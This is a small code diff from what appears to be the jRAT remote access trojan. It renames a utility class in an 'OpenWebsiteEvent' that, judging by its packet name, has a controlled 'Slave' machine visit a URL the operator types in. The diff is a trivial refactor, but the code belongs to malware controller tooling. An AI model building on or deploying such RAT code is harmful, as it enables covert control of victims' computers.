@@ -5,7 +5,7 @@ import javax.swing.ImageIcon;
 import pro.jrat.Slave;
 import pro.jrat.packets.outgoing.Packet14VisitURL;
 import pro.jrat.utils.IconUtils;
-import pro.jrat.utils.Util;
+import pro.jrat.utils.Utils;
 
 
 
@@ -35,7 +35,7 @@ public class OpenWebsiteEvent extends Event {
 
 	@Override
 	public boolean add() {
-		String result = Util.showDialog("Visit URL", "Input URL to visit");
+		String result = Utils.showDialog("Visit URL", "Input URL to visit");
 		
 		if (result != null && !result.startsWith("http://")) {
 			result = "http://" + result;
